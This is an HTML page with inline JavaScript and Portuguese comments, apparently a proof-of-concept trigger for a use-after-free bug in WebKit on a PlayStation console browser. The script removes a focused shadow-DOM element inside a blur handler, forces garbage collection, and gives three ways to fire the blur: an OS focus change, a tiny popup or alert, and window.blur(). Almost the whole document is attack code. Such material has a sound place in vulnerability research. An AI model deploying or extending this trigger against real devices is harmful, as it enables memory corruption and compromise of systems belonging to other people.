<!DOCTYPE html>
<html>
<body>
<p id="status">Setup...</p>
<div id="host"></div>
<div id="result"></div>
<button id="btn" style="font-size:2em;padding:1em">TRIGGER (tap aqui)</button>
<script>
function gc() {
    function gcRec(n) {
        if (n < 1) return {};
        var temp = {i: "ab" + i + (i / 100000)};
        temp += "foo";
        gcRec(n-1);
    }
    for (var i = 0; i < 10000; i++)
        gcRec(10);
}

function setup() {
    let shadowRoot = host.attachShadow({ mode: 'open' });
    let victim = document.createElement('div');
    victim.tabIndex = 0;
    victim.textContent = 'Focusable';
    shadowRoot.appendChild(victim);

    document.addEventListener('blur', function onBlur() {
        victim.remove();
        victim = null;
        gc();
        document.removeEventListener('blur', onBlur, true);
    }, true);

    victim.focus();
    return victim;
}

setup();
status.textContent = 'Pronto. Trigger via botão ou botão PS.';

// Trigger 1: botão PS ou qualquer perda de foco do OS → automático via blur no window
window.addEventListener('blur', () => {
    result.textContent = 'window blur disparado';
});

// Trigger 2: botão na página → abre popup, o parent perde setIsKey
btn.addEventListener('click', () => {
    setup(); // reset se já rodou
    
    // Tenta popup (mais portável no WebKit)
    let popup = window.open('about:blank', '_blank', 'width=1,height=1');
    if (popup) {
        popup.focus();
        setTimeout(() => popup.close(), 500);
    } else {
        // Fallback: dialog de sistema rouba o foco
        // O blur no document dispara de forma síncrona antes do alert retornar
        setTimeout(() => alert('trigger'), 0);
    }
});

// Trigger 3: window.blur() direto (funciona em algumas versões do Orbis WebKit)
// window.blur();
</script>
</body>
</html>
